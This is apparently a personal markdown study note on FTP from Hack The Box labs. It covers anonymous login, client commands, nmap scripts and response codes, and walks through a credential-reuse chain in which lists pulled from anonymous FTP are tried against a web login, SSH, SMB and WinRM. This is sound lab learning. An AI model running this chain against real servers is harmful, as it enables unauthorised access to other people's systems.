---
tags: [ftp]
---

> **FTP** transfers files over TCP using two channels: **control** (port 21) and **data** (port 20 or negotiated). This guide covers what we've practiced.

---

## Quickstart — Anonymous Login

```bash
$ ftp 10.129.1.10
Name: anonymous
Password: <anything or just Enter>
ftp> ls
ftp> get flag.txt
ftp> quit
```

**Try toggling passive mode if the server rejects your data connection:**
```bash
ftp> passive
```

---

## Essential Client Commands

| Command | What it does |
| :------ | :------ |
| `open <host>` | Connect to an FTP server |
| `ls` / `dir` | List files |
| `cd <path>` | Change directory |
| `pwd` | Show current directory |
| `get <file>` | Download a file |
| `mget *.txt` | Download multiple files |
| `passive` | Toggle passive mode on/off |
| `binary` | Switch to binary mode |
| `quit` / `bye` | Disconnect |

---

## Anonymous FTP → Credential Reuse Chain

Anonymous FTP is often the **first step** in a multi-service attack chain. When you find readable files, immediately test discovered credentials against all other services (SSH, web panels, SMB, WinRM).

### Classic chain (from HTB Crocodile)

```
Anonymous FTP → download user/password lists → Gobuster finds hidden login → credential reuse → admin panel
```

**Step 1 — Download everything from the anonymous FTP:**
```bash
$ ftp 10.129.1.15
Name: anonymous
Password: <Enter>
ftp> passive
ftp> ls
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> quit
```

**Step 2 — Pair credentials (line by line):**
```bash
$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin

$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd

# Line 4 users[4] + passwords[4] → admin:rKXM59ESxesUFHAd
```

**Step 3 — Test against every other service:**
```bash
# Web login form (the actual vector in Crocodile)
curl -d 'user=admin&pass=rKXM59ESxesUFHAd' http://10.129.1.15/login.php -L -v

# SSH
ssh admin@10.129.1.15

# SMB
smbclient -L 10.129.1.15 -U 'admin%rKXM59ESxesUFHAd'

# WinRM (if port 5985 is open)
evil-winrm -i 10.129.1.15 -u admin -p 'rKXM59ESxesUFHAd'
```

> 💡 **Key insight:** Files named `allowed.userlist` and `allowed.userlist.passwd` in the FTP root are a clear signal of credential reuse. Always download **both** files together and test every username/password pair.

---

## Useful Nmap Scripts

```bash
# Check anonymous access + list files
nmap --script ftp-anon -p21 10.129.1.10

# Service + version detection
nmap -sV -p21 10.129.1.10
```

---

## vsftpd Notes

- **vsftpd** — "Very Secure FTP Daemon", very common on Linux
- Anonymous access depends on `anonymous_enable=YES` in `/etc/vsftpd.conf`
- We saw it on: **Fawn** (flag directly in root), **Crocodile** (user/password lists → web login)

---

## Response Codes — What you'll see

| Code | Meaning |
| :--- | :---------- |
| **220** | Service ready |
| **227** | Entering Passive Mode |
| **230** | Login successful ✅ |
| **331** | Username OK, needs password |
| **425** | Can't open data connection (try `passive`) |
| **530** | Not logged in |

---

## 🔗 Related

**Machines:** [[🦌 Fawn]], [[🐊 Crocodile]]

**Guides:** [[💣 Gobuster]], [[🐬 MySQL]]

---

## References

- [RFC 959](https://tools.ietf.org/html/rfc959) — FTP Standard
- [vsftpd](https://security.appspot.com/vsftpd.html)
